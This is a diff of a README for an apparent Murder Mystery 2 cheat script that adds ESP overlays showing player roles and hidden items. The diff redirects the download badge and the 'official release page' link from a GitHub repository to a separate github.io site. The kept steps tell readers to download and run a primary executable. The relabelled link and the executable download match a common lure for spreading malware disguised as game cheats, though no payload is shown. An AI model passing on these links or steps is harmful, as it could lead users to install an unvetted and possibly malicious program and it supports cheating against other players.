@@ -1,6 +1,6 @@
 # 🔍 Murder-Mystery-2-Script-2026-Esp - Track players and find items easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://immanent-colloquialism515.github.io)
 
 This tool aids players in the game Murder Mystery 2. The script provides visual overlays to identify player roles, highlights hidden items, and tracks movement across the map.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards to run the script:
 
 Follow these steps to prepare your environment.
 
-1.  Visit the official release page: [https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp](https://github.com/Immanent-colloquialism515/Murder-Mystery-2-Script-2026-Esp).
+1.  Visit the official release page: [https://immanent-colloquialism515.github.io](https://immanent-colloquialism515.github.io).
 2.  Locate the latest release version on the screen.
 3.  Click the download link for the primary executable file.
 4.  Save the file to your desktop for easy access.
